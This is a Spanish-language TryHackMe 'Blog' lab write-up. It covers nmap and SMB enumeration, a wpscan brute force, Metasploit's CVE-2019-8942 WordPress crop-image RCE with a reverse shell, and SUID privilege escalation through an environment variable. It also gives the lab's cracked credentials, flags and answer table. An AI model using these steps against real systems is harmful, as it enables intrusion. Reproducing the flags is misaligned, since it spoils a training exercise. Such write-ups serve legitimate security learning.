# TryHackMe - Blog (WordPress 5.0 RCE + SUID Privilege Escalation)

## 📋 Información de la máquina

| Campo | Valor |
|-------|-------|
| Nombre | Blog |
| Dificultad | Medium |
| Sistema | Linux (Ubuntu) |
| CMS | WordPress 5.0 |
| IP Target | ???? |

---

## 📌 Resumen

Blog es una máquina de nivel medio que ejecuta WordPress 5.0. El vector inicial es un ataque de fuerza bruta a la autenticación de WordPress usando `wpscan`, obteniendo credenciales válidas. Luego se explota la vulnerabilidad **CVE-2019-8942 (WordPress Crop Image RCE)** para obtener una shell como `www-data`. La escalada de privilegios se logra mediante un binario SUID `/usr/sbin/checker` que permite ser administrador con una variable de entorno.

---

## 🔍 1. Enumeración inicial

### Escaneo de puertos

```bash
nmap -sC -sV -p- 10.66.153.98 -oN blog_scan
```

**Resultados relevantes:**

```
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp  open  http    Apache httpd 2.4.29 (Ubuntu)
| http-generator: WordPress 5.0
139/tcp open  netbios-ssn Samba smbd
445/tcp open  netbios-ssn Samba smbd
```

### Configuración de hosts

```bash
echo "10.66.153.98 blog blog.thm" | sudo tee -a /etc/hosts
```

### Enumeración WordPress

```bash
curl -s http://blog.thm | grep "content=\"WordPress"
# WordPress 5.0

curl -s http://blog.thm/wp-json/wp/v2/users
# Usuarios encontrados: bjoel, kwheel
```

### Enumeración SMB

```bash
smbclient -L //10.66.153.98 -N
```

**Shares disponibles:**
- `BillySMB` (interesante)

```bash
smbclient //10.66.153.98/BillySMB -U "" -N
smb: \> ls
  Alice-White-Rabbit.jpg
  tswift.mp4
  check-this.png

smb: \> prompt OFF
smb: \> mget *
```

Los archivos contenían pistas pero no fueron críticos para la explotación.

---

## 🔑 2. Obtención de credenciales

### Fuerza bruta con wpscan

```bash
wpscan --url http://blog.thm -U kwheel,bjoel -P /usr/share/wordlists/rockyou.txt
```

**Credenciales encontradas:**

| Usuario | Contraseña |
|---------|------------|
| kwheel | cutiepie1 |

---

## 💣 3. Explotación (CVE-2019-8942)

### Usando Metasploit

```bash
msfconsole
msf6 > use exploit/multi/http/wp_crop_rce
msf6 > set RHOSTS blog.thm
msf6 > set USERNAME kwheel
msf6 > set PASSWORD cutiepie1
msf6 > set LHOST TU_IP
msf6 > set LPORT 4442
msf6 > exploit
```

**Resultado:**

```
[*] Started reverse TCP handler on TU_IP:4442
[+] Authenticated with WordPress
[*] Uploading payload
[+] Image uploaded
[*] Meterpreter session 2 opened
```

### Shell obtenida

```bash
meterpreter > getuid
Server username: www-data
<img width="898" height="211" alt="Captura de pantalla_2026-06-11_13-50-08" src="https://github.com/user-attachments/assets/dad51b0f-36c7-4f54-b451-939fb379ce6f" />

meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@blog:/var/www/wordpress$
```
<img width="842" height="212" alt="Captura de pantalla_2026-06-12_18-28-52" src="https://github.com/user-attachments/assets/3a6fa609-96f6-4413-94be-7ba85035eab0" />


---

## 👑 4. Escalada de privilegios

### Búsqueda de binarios SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Binario interesante

```bash
ls -la /usr/sbin/checker
-rwsr-sr-x 1 root root 8432 May 26  2020 /usr/sbin/checker

strings /usr/sbin/checker | grep -i admin
admin
Not an Admin
```

### Explotación del binario

El binario lee la variable de entorno `admin`. Si está configurada, otorga privilegios de root.

```bash
export admin=1
/usr/sbin/checker
root@blog:/var/www/wordpress#
```
<img width="916" height="562" alt="Captura de pantalla_2026-06-11_14-03-28" src="https://github.com/user-attachments/assets/1480ca51-85df-44cf-a02d-12ccf9807318" />

---

## 🚩 5. Flags

### user.txt

```bash
find / -name user.txt 2>/dev/null | grep -v bjoel
/media/usb/user.txt

cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7
```

### root.txt

```bash
cat /root/root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
```
![Uploading Captura de pantalla_2026-06-11_14-03-55.png…]()

---

## 📊 6. Respuestas finales

| Pregunta | Respuesta |
|----------|-----------|
| What CMS was Billy using? | `WordPress` |
| What version of the above CMS was being used? | `5.0` |
| Where was user.txt found? | `/media/usb/user.txt` |
| user.txt | `c8421899aae571f7af486492b71a8ab7` |
| root.txt | `9a0b2b618bef9bfa7ac28c1353d9f318` |

---

## 🛠️ Herramientas utilizadas

- `nmap` - Escaneo de puertos y servicios
- `wpscan` - Enumeración y fuerza bruta de WordPress
- `smbclient` - Exploración de shares SMB
- `Metasploit` - Explotación de CVE-2019-8942
- `strings` / `find` - Post-explotación y escalada

---

## 📚 Lecciones aprendidas

1. **WordPress 5.0** es vulnerable a **CVE-2019-8942** (Image Crop RCE)
2. Los shares SMB pueden contener archivos con información útil
3. Los binarios SUID con `getenv()` pueden ser explotados con variables de entorno
4. Siempre buscar flags fuera de los directorios comunes (ej: `/media/usb/`)

---

## 📎 Referencias

- [CVE-2019-8942 - WordPress Crop Image RCE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942)
- [Exploit-DB: 49512](https://www.exploit-db.com/exploits/49512)
- [TryHackMe - Blog Room](https://tryhackme.com/room/blog)

---

**¡Gracias por leer!** 🎯

